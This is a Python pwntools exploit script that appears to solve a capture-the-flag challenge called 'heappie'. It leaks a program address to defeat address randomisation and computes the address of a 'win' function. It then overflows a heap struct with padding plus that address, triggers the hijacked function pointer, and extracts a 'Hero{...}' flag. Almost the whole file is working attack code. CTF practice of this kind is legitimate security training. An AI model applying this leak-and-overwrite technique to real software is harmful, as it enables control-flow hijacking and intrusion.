#!/home/kali/.venv/bin/python3
from pwn import ELF, remote, context, process, p64
import re

exe = './heappie'
elf = context.binary = ELF(exe, checksec=False)
p = process(exe)

win_offset = elf.symbols['win']

# filling a first struct to leak an address:
p.sendline(b'1')
p.sendline(b'y')
p.sendline(b'play_1')
p.sendline(b'0')
p.sendline(b'biboup')

# leak address
p.sendline(b'4')

# collect data to parse it
data = p.recv(8192*10).decode()

# collect the leaked address
matches = re.search('song: (0x[0-9A-Fa-f]+)', data)
matches = str(matches.group(0))[6:]

if matches:
    play_1_addr = int(matches, 16)
    print(f"play_1_addr: {hex(play_1_addr)}")
else:
    print("found nothing")

# getting win_runtime_addr:
play_1_offset = elf.symbols['play_1']
print(f"play_1_offset: {hex(play_1_offset)}")

elf_base_addr = play_1_addr - play_1_offset
print(f"elf_base_addr: {hex(elf_base_addr)}")

win_runtime_addr = elf_base_addr + win_offset
print(f"win_runtime_addr: {hex(win_runtime_addr)}")

# overflowing second struct:
p.sendline(b'1')
p.sendline(b'n')
p.sendline(b'play_2')
p.sendline(b'1')
p.sendline(b'A' * 128 + p64(win_runtime_addr))

# third struct containing p64(win_runtime_addr)
p.sendline(b'1')
p.sendline(b'n')
p.sendline(b'play_3')
p.sendline(b'2')
p.sendline(b'eeee')

# now play_3 contains the win runtime address so lets play it:
p.sendline(b'2') 
p.sendline(b'2')

# grabbing the flag:
data = p.recv(8192).decode()
matches = re.search(r'Hero\{[^}]+\}', data)
matches = str(matches.group(0))

if matches:
    flag = matches
    print(f'flag found: {flag}')
else:
    print('flag not found')

p.close()
